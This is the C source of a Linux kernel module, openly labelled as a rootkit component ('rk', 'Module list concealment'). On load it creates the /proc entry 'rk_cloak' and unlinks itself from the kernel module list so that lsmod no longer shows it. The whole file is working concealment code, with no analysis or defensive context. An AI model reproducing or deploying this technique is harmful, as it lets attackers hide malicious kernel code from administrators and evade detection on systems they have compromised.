// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>

static struct proc_dir_entry *proc_entry;
static struct list_head *saved_prev;

static void vanish_from_lsmod(void)
{
	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	pr_info("rk: module hidden from lsmod\n");
}

static ssize_t stealth_show(struct file *file, char __user *buffer,
			    size_t count, loff_t *position)
{
	static const char msg[] = "hidden\n";

	return simple_read_from_buffer(buffer, count, position,
				       msg, sizeof(msg) - 1);
}

static const struct proc_ops stealth_ops = {
	.proc_read = stealth_show,
};

static int __init conceal_init(void)
{
	proc_entry = proc_create("rk_cloak", 0444, NULL, &stealth_ops);
	if (!proc_entry)
		return -ENOMEM;

	vanish_from_lsmod();
	return 0;
}

static void __exit conceal_exit(void)
{
	proc_remove(proc_entry);
}

module_init(conceal_init);
module_exit(conceal_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Module list concealment");
